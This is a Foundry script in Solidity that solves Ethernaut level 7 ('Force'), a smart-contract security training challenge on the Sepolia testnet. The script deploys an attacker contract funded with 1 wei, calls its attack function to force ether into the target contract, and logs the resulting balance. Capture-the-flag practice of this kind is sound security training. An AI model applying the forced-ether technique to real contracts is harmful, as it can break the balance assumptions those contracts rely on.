// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Force, ForceAttacker} from "../../src/ethernaut/07.sol";

// forge script script/ethernaut/07.s.sol --rpc-url $SEPOLIA_RPC_URL --account PK1_SEPOLIA --sender <ADDRESS> --broadcast -vvvv
// cast balance 0xa2f1BBA624fF9828826Ef3Bd8ab5cdA640589531 --rpc-url $SEPOLIA_RPC_URL
// forge verify-contract --rpc-url $SEPOLIA_RPC_URL --etherscan-api-key $ETHERSCAN_API_KEY --watch 0xb6c2Ec883DaAac76D8922519E63f875c2ec65575 src/ethernaut/07.sol:Force

contract ForceScript is Script {
    Force public forceContract =
        Force(0xa2f1BBA624fF9828826Ef3Bd8ab5cdA640589531);
    ForceAttacker public forceAttacker;

    function setUp() public {
        vm.broadcast();
        forceAttacker = new ForceAttacker{value: 1 wei}(address(forceContract));
    }

    function run() public {
        vm.startBroadcast();
        forceAttacker.attack();
        console.log(
            "Force contract balance after attack: ",
            address(forceContract).balance
        );
        vm.stopBroadcast();
    }
}
